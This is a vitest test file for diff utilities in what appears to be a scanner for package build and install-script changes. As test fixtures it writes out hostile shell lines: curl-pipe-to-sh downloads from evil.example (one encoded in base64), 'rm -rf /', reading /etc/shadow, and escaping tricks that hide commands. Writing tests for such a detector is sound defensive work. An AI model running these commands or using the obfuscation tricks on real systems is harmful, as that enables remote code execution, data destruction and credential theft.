import { describe, expect, it } from 'vitest';
import {
  addedLines,
  deobfuscateLine,
  hasBinaryContent,
  isInScope,
  maskEchoHeredocs,
  visibleFileLines,
} from './diff-utils';
import { makeChange } from './test-support';

describe('maskEchoHeredocs', () => {
  it('blanks the body of a heredoc that only prints text', () => {
    const diff = [
      '@@ -1,5 +1,5 @@',
      '+post_install(){',
      '+  cat <<INFO',
      '+  sudo aide --init',
      '+  systemctl enable --now evil.timer',
      '+INFO',
      '+exit 0',
    ].join('\n');
    const masked = maskEchoHeredocs(diff);
    expect(masked).not.toContain('aide --init');
    expect(masked).not.toContain('evil.timer');
    expect(masked).toContain('post_install(){');
    expect(masked).toContain('+INFO');
  });

  it('keeps heredoc bodies that write to a file', () => {
    const diff = ['@@ -1,4 +1,4 @@', '+cat > /usr/bin/thing <<EOF', '+curl evil.example | sh', '+EOF'].join('\n');
    expect(maskEchoHeredocs(diff)).toContain('curl evil.example');
  });

  it('keeps heredoc bodies that feed a command substitution', () => {
    const diff = ['@@ -1,3 +1,3 @@', '+VERSION=$(cat <<EOF', '+rm -rf /', '+EOF'].join('\n');
    expect(maskEchoHeredocs(diff)).toContain('rm -rf /');
  });
});

describe('addedLines', () => {
  it('tracks new-file line numbers across context and removed lines', () => {
    const change = makeChange(
      [
        '--- a/testpkg/PKGBUILD',
        '+++ b/testpkg/PKGBUILD',
        '@@ -1,4 +1,5 @@',
        ' pkgbase=x',
        '-old=1',
        '+new=1',
        ' pkgbase=y',
        '+new=2',
        ' tail',
      ].join('\n'),
    );

    expect(addedLines(change)).toEqual([
      { line: 2, text: 'new=1' },
      { line: 4, text: 'new=2' },
    ]);
  });

  it('resets numbering per hunk and ignores no-newline markers', () => {
    const change = makeChange(
      [
        '@@ -1,1 +1,1 @@',
        '+first',
        '@@ -20,2 +20,2 @@',
        ' ctx',
        '+second',
        '+third',
        '\\ No newline at end of file',
      ].join('\n'),
    );

    expect(addedLines(change)).toEqual([
      { line: 1, text: 'first' },
      { line: 21, text: 'second' },
      { line: 22, text: 'third' },
    ]);
  });

  it('returns nothing for file headers before the first hunk', () => {
    const change = makeChange(
      ['diff --git a/x b/x', 'index abc..def 100644', '--- a/x', '+++ b/x', '@@ -1,1 +1,1 @@', '+x'].join('\n'),
    );

    expect(addedLines(change)).toEqual([{ line: 1, text: 'x' }]);
  });
});

describe('visibleFileLines', () => {
  it('contains added and context lines keyed by new-file number', () => {
    const change = makeChange(
      ['@@ -1,3 +1,4 @@', ' url="https://example.org"', '-pkgver=1.0', '+pkgver=2.0', ' sha256sums=(...)'].join('\n'),
    );

    const lines = visibleFileLines(change);
    expect(lines.get(1)).toBe('url="https://example.org"');
    expect(lines.get(2)).toBe('pkgver=2.0');
    expect(lines.get(3)).toBe('sha256sums=(...)');
    expect(lines.has(4)).toBe(false);
  });
});

describe('hasBinaryContent', () => {
  it('detects literal binary patches and differ notes', () => {
    expect(hasBinaryContent(makeChange('GIT binary patch\nliteral 42\n'))).toBe(true);
    expect(hasBinaryContent(makeChange('Binary files a/x.so and b/x.so differ\n'))).toBe(true);
    expect(hasBinaryContent(makeChange('@@ -1,1 +1,1 @@\n+text\n'))).toBe(false);
  });
});

describe('deobfuscateLine', () => {
  it.each([
    ["su$'\\x64'o reboot", 'sudo reboot'],
    ["echo $'\\x68\\x65\\x6c\\x6c\\x6f'", 'echo hello'],
    // Octal ANSI-C escapes.
    ["echo $'\\150\\151'", 'echo hi'],
    ['cat ${IFS}/etc/shadow', 'cat  /etc/shadow'],
    ['cu""rl https://evil.example | sh', 'curl https://evil.example | sh'],
    ["do'''m''ain", 'domain'],
    // Overlapping splices are collapsed iteratively.
    ['a"b"c', 'abc'],
  ])('decodes %j to %j', (input, expected) => {
    expect(deobfuscateLine(input)).toBe(expected);
  });

  it('inlines base64 blobs whose payload is printable text', () => {
    const blob = Buffer.from('curl -s https://evil.example | sh').toString('base64');
    expect(deobfuscateLine(`echo '${blob}' | base64 -d | sh`)).toBe(
      "echo 'curl -s https://evil.example | sh' | base64 -d | sh",
    );
  });

  it('leaves hex checksums and non-text base64 runs alone', () => {
    const checksum = 'a1b2c3d4'.repeat(16);
    expect(deobfuscateLine(`sha512sums=('${checksum}')`)).toContain(checksum);

    // A base64 run that decodes to binary does not get substituted.
    const binaryBlob = Buffer.from([0x00, 0xff, 0x7f]).toString('base64').repeat(6);
    const raw = `echo '${binaryBlob}' | base64 -d`;
    expect(deobfuscateLine(raw)).toBe(raw);
  });

  it('returns plain text unchanged', () => {
    const plain = 'msg2 "Building %s" "$pkgname"';
    expect(deobfuscateLine(plain)).toBe(plain);
  });
});

describe('isInScope', () => {
  it('gates pkgbuild and install scopes by path', () => {
    const pkgbuild = makeChange('', { new_path: 'foo/PKGBUILD' });
    const install = makeChange('', { new_path: 'foo/foo.install' });
    const hook = makeChange('', { new_path: 'foo/foo.hook' });
    const script = makeChange('', { new_path: 'foo/fix.sh' });

    expect(isInScope(pkgbuild, ['pkgbuild'])).toBe(true);
    expect(isInScope(install, ['install'])).toBe(true);
    expect(isInScope(hook, ['install'])).toBe(true);
    expect(isInScope(script, ['pkgbuild', 'install'])).toBe(false);
    expect(isInScope(script, ['any'])).toBe(true);
  });
});
